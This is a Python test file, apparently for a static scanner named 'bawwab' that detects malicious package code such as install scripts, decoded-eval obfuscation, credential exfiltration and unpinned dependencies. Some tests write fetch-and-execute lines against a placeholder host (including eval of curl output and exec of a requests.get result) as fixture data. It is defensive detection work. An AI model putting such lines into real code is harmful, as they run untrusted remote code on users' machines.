from __future__ import annotations

import os
from pathlib import Path

import pytest

from bawwab.scan.files import load_files
from bawwab.scan.rules import CATALOG, run_static_rules
from bawwab.severity import compute_verdict
from bawwab.types import Severity, Verdict

FIX = Path(__file__).parent / "fixtures" / "code"


def scan(name: str):
    files, load_findings = load_files(FIX / name)
    return load_findings + run_static_rules(files)


def pairs(findings):
    return {(f.rule, f.severity) for f in findings}


def test_clean_server_has_no_findings():
    assert scan("clean_server") == []


def test_benign_postinstall_is_exactly_install_script_med():
    findings = scan("benign_postinstall")
    assert [(f.rule, f.severity) for f in findings] == [("install-script", Severity.MED)]
    assert findings[0].file == "package.json"
    assert findings[0].line == 5


def test_postinstall_curl_is_malicious():
    findings = scan("postinstall_curl")
    assert ("install-script.remote", Severity.CRITICAL) in pairs(findings)
    assert ("remote-code.pipe-shell", Severity.CRITICAL) in pairs(findings)
    assert compute_verdict(findings) == Verdict.MALICIOUS


@pytest.mark.parametrize("name", ["eval_b64_js", "eval_b64_py"])
def test_eval_decoded(name):
    findings = scan(name)
    hits = [f for f in findings if f.rule == "obfuscation.eval-decoded"]
    assert hits and hits[0].severity == Severity.CRITICAL
    assert hits[0].file and hits[0].line


@pytest.mark.parametrize("name", ["cred_exfil_js", "cred_exfil_py"])
def test_cred_exfil(name):
    findings = scan(name)
    for rule in ("credential-access", "exfil.host", "exfil.combo"):
        hits = [f for f in findings if f.rule == rule]
        assert hits, rule
        assert hits[0].file and hits[0].line
    assert len([f for f in findings if f.rule == "exfil.combo"]) == 1
    assert compute_verdict(findings) == Verdict.MALICIOUS


def test_symlink_not_loaded(tmp_path):
    (tmp_path / "a.txt").write_text("hi")
    os.symlink("/etc/passwd", tmp_path / "pw")
    files, _ = load_files(tmp_path)
    assert [f.rel for f in files] == ["a.txt"]


def test_binary_skipped(tmp_path):
    (tmp_path / "b.bin").write_bytes(b"abc\x00def")
    (tmp_path / "a.txt").write_text("hi")
    files, findings = load_files(tmp_path)
    assert [f.rel for f in files] == ["a.txt"] and findings == []


def test_max_files_truncated(tmp_path):
    for n in "abc":
        (tmp_path / f"{n}.txt").write_text(n)
    files, findings = load_files(tmp_path, max_files=2)
    assert len(files) == 2
    assert [(f.rule, f.severity) for f in findings] == [("files.truncated", Severity.MED)]


def test_max_file_bytes_truncated(tmp_path):
    (tmp_path / "big.txt").write_text("x" * 100)
    files, findings = load_files(tmp_path, max_file_bytes=10)
    assert files == [] and findings[0].rule == "files.truncated"


def test_blob_and_unpinned_deps(tmp_path):
    (tmp_path / "package.json").write_text(
        '{\n "dependencies": {"a": "*", "b": "latest", "c": "git+https://x.invalid/c.git", "d": "1.2.3"}\n}\n'
    )
    (tmp_path / "x.js").write_text('const b = "' + "QUJD" * 60 + '";\n')
    (tmp_path / "requirements.txt").write_text("foo==1.0\nbar @ git+https://x.invalid/bar.git\n")
    files, _ = load_files(tmp_path)
    findings = run_static_rules(files)
    assert sum(f.rule == "deps.unpinned" for f in findings) == 4
    assert any(f.rule == "obfuscation.blob" and f.file == "x.js" for f in findings)


def test_eval_fetch_and_dynamic_import(tmp_path):
    (tmp_path / "a.js").write_text('eval(await (await fetch("https://x.invalid/a")).text());\nimport("https://x.invalid/m.js");\n')
    (tmp_path / "b.py").write_text('import requests\nexec(requests.get("https://x.invalid/a").text)\n')
    (tmp_path / "c.sh").write_text('eval "$(curl -s https://x.invalid/a)"\n')
    files, _ = load_files(tmp_path)
    got = {(f.file, f.line) for f in run_static_rules(files) if f.rule == "remote-code.eval-fetch"}
    assert {("a.js", 1), ("a.js", 2), ("b.py", 2), ("c.sh", 1)} <= got


def test_setup_py_install_script(tmp_path):
    (tmp_path / "setup.py").write_text("import os\nos.system('echo hi')\n")
    files, _ = load_files(tmp_path)
    assert pairs(run_static_rules(files)) == {("install-script", Severity.MED)}


def test_every_emitted_rule_id_in_catalog():
    seen = set()
    for d in FIX.iterdir():
        seen |= {f.rule for f in scan(d.name)}
    seen.add("files.truncated")
    assert seen <= set(CATALOG)
    for rid, info in CATALOG.items():
        assert info.id == rid and info.title and info.why and info.fix
